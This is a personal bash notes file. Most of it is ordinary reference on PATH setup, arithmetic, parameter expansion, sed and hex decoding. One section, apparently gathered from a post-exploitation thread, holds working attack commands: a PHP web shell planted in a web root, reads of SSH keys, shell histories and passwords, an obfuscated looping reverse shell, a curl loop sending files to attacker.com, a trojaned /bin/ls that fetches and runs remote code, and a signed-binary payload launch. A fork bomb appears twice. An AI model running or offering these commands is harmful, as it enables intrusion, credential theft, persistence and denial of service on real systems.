# from https://superuser.com/questions/39751/add-directory-to-path-if-its-not-already-there/39995#39995
# for bashrc
pathadd() {
    if [ -d "$1" ] && [[ ":$PATH:" != *":$1:"* ]]; then
        export PATH="${PATH:+"$PATH:"}$1"
	echo "### $PATH"
    fi
}
pathadd ~/bin
pathadd ~/Library/Android/sdk/platform-tools/


*****************************
# from twitter @JaneScott_ ask first cmds to run
# given a low priv shell on linux, responses
Cd /tmp && wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh â€¦ then chmod +Ã— LinEnum. sh lastly ./LinEnum.sh

w;uname -a;lsb_release -a

history
find / -perm -4000 -exec ls -l {} \;

$ find /var/www -perm -o+w
$ echo "<?php passthru($_GET['cmd']); ?>" > /var/www/<dir output from command 1>/not-a-shell.php

printenv
ifconfig -a
iptable -L
cat /etc/apache2/site-enabled/*
netstat -punta
ps aux
crontab -L
cat /etc/cron*
grep -iR -C 5 "password" /home/*
cat /home/*/.bash_history
cat /home/*/.ssh/*

https://github.com/diego-treitos/linux-smart-enumeration

# :(){ :|: & };:

P=( $(ps -u "$USER"|awk '{print $4}'|sed -e '/..../!d') );cS="${P["$[RANDOM % ${#P[@]}]"]}";cp /bin/sleep /tmp/$cS;cB="${P["$[RANDOM % ${#P[@]}]"]}";cp /bin/bash /tmp/$cB;while true;do /tmp/"$cS" 9 && /tmp/"$cB" -i >& /dev/tcp/0x0A2A0001/1 0>&1;done

# start exfil of recently modified files:
find / -readable -size -100M -mtime -10 -type f -iregex '.*\.\(pdf\|txt\|kdbx\|conf\|sh\|src\|tar\|pub\)$' -exec /usr/bin/curl -X POST -F "data=@{}" http://attacker.com/exfil.php  \;

find / -perm -u=s -type f 2>/dev/null

1. cp /bin/ls /bin/LS
2. echo "#!/bin/bash\n curl http://abx.ir/evil  | bash\n LS $@" > /bin/ls

unix-privesc-check

Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\

Then

%userprofile%\AppData\Local\Microsoft\Teams\Update.exe --processStart payload.exe --process-start-args "whatever args"

Trusted signed binary will run the payload for you ðŸ˜Š


*****************************
turn history on or off

set +o history

set -o history

also, if you put a space in front of the command it will not be recorded
in history!!!!!

*****************************

base64 
 find this a lot in web based stuff 

important base64 url_safe safety tip - fix it before decoding
cat foo.64 | tr -- "-_" "+/" | base64 -d > foo.txt
or it won't 

****
similarly, c++ and java mangled symbol names can be decoded:

$ echo "_ZN4DionC1Ev" | c++filt
Dion::Dion()
$ echo _Z1fv, | c++filt -n
f(),

*****************************

numbers

num=$((num1 + num2))
num=$(($num1 + $num2))       # also works
num=$((num1 + 2 + 3))        # ...
num=$[num1+num2]             # old, deprecated arithmetic expression syntax
Using the external expr utility. Note that this is only needed for really old systems.

num=`expr $num1 + $num2`     # whitespace for expr is important

*****************************

fork bomb

 :(){ :|:& };: 


*****************************

convert an xlsx to csv use ssconvert (part of numeric)

ssconvert foo.xlsx foo.csv

*****************************
print out the invocation of all running processes
(mainly captured also as example of for, if, file exists, string is null)

for p in `ls -1d /proc/[1-9]*`; do if [ -f "$p/cmdline" ]; then s="`cat $p/cmdline`"; if [ ! -z "$s" ]; then echo "$p $s"; fi; fi; done 2> /dev/null

*****************************

find which programs use a library
(assumes ability to read most stuff in /proc)

for i in `grep libvorbis [0-9]*/maps | sed 'sv/.*vv'|sort|uniq`; do cat $i/cmdline; echo; done


*****************************
convert hex digits to ascii

echo "2f73797374656d2f" | xxd -p -r
/system/

or if we have a string like this:
"2f 73 79 73 74 65 6d 2f"

echo "2f 73 79 73 74 65 6d 2f" | xxd -p -r
/system/

or 

for c in `echo "2f 73 79 73 74 65 6d 2f"` ; do printf "\x$c"; done
/system/

*****************************
little endian

appears in memory/code byte swapped per 16 bits:

memory:
aabb ccdd eeff gghh

is really:
bbaa ddcc ffee hhgg

for example, we might see 64 bits like this in memory:

732f 7379 6574 2f6d

this is ascii: /system/
once the bytes are swapped (if little endian)

*****************************

loop on lines (protects when there are spaces in filenames for example):

( IFS=$'\n'; for i in `ls *.pdf`; do bzip2 -9 $i ; done )

bzips all pdfs in a directory. The parens limit the change to IFS
to only this execution.

*********************************

display a set of lines from a file:
Assuming you need lines 20 to 40,

sed -n '20,40p;41q' file_name

or, for multiple sections, something like:
sed -n '5,8p;20,25p;26q' README.md

use tail to skip first N lines or show last N lines:

tail -n +11 file.txt  # start print at line 11 - skip first 10

tail -n 10 file.txt   # print out last 10 lines

**************************************

grep regx/regular expression to find ipv4 addresses:

grep "[12]\{0,1\}[0-9]\{0,1\}[0-9]\.[1-2]\{0,1\}[0-9]\{0,1\}[0-9]\.[1-2]\{0,1\}[0-9]\{0,1\}[0-9]\.[1-2]\{0,1\}[0-9]\{0,1\}[0-9]" secure* 


*************

bash filename manipulation examples

~% FILE="example.tar.gz"
~% echo "${FILE%%.*}"
example
~% echo "${FILE%.*}"
example.tar
~% echo "${FILE#*.}"
tar.gz
~% echo "${FILE##*.}"
gz

also, for chopping filename and path:

# dirname /etc/shadow
/etc
# basename /etc/shadow
shadow

# for i in {1..10}; do echo -n "$i " ; done
1 2 3 4 5 6 7 8 9 10 

**********************************

create 'seq n' directories with consecutive days:
seq 5 | xargs -n1 -I{} date -d "+{} days" +%Y%m%d | xargs mkdir

(xargs) -n1 does 1 argument from the feeding command
        -I{} use argument as input to command (date)
(date) +{} days  -  add $arg days to date

**********************************


Assignment
Assign value to variable if variable is not already set. Value will be returned.

Couple with : no-op if return value is to be discarded.	${variable="value"}
: ${variable="value"}

Removal

Delete shortest match of needle from front of haystack	${haystack#needle}
Delete longest match of needle from front of haystack	${haystack##needle}
Delete shortest match of needle from back of haystack	${haystack%needle}
Delete longest match of needle from back of haystack	${haystack%%needle}

Replacement

Replace first match of needle with replacement from haystack	${haystack/needle/replacement}
Replace all matches of needle with replacement from haystack	${haystack//needle/replacement}
If needle matches front of haystack replace with replacement	${haystack/#needle/replacement}
If needle matches back of haystack replace with replacement	${haystack/%needle/replacement}

Substitution

If variable not set, return value, else variable	${variable-value}
If variable not set or empty, return value, else variable	${variable:-value}
If variable set, return value, else null string	${variable+value}
If variable set and not empty, return value, else null string	${variable:+value}

Extraction

Extract length characters from variable starting at position	${variable:position:length}
String length of variable	${#variable}


******************

quoting guide for shell

http://resources.mpi-inf.mpg.de/departments/rg1/teaching/unixffb-ss98/quoting-guide.html

